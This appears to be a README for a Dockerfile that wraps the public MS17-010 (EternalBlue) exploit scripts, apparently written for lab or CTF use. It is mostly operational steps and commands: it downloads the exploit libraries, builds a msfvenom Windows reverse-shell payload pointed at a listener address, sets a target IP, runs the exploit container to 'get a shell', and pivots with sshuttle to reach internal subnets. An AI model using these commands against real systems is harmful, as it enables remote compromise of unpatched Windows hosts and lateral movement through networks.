# MS17-010-Dockerfile

Most of the python scripts to manually use MS17-010 depends on python2 and pip. This just makes it easier to use.

This is a dockerfile to make the use of send_and_execute.py easier. 

It uses the library mysmb.py from 

wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py

And send_and_execute from 

https://raw.githubusercontent.com/H3xL00m/MS17-010_CVE-2017-0143/main/send_and_execute.py

# How to use it

1) Git clone this repo

2) Generate your payload

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.52 LPORT=44449 EXITFUNC=thread -f exe -a x86 --platform windows -o -rev.exe
```

Put it in files/

3) Modify the Dockerfile to set your target. Change the last line

```
CMD ["/usr/local/bin/python", "./send_and_execute.py", "172.16.1.20", "./rev.exe"]
```

3) Build your container

```
docker build -t eternalblue ./
```

4) Setup your listener to the port used in your payload

5) Run your container

```
docker run -it eternalblue
```

6) Get a shell

## Pivoting

I've had good luck with sshuttle to target a host that is not directly accessible from my local machine

Make sure that sshuttle is exposing the rules to 0.0.0.0

```
sshuttle -r root@10.10.110.100 172.16.1.0/24 -v --dns -l 0.0.0.0
```

Bring the tunnel up just before running the container


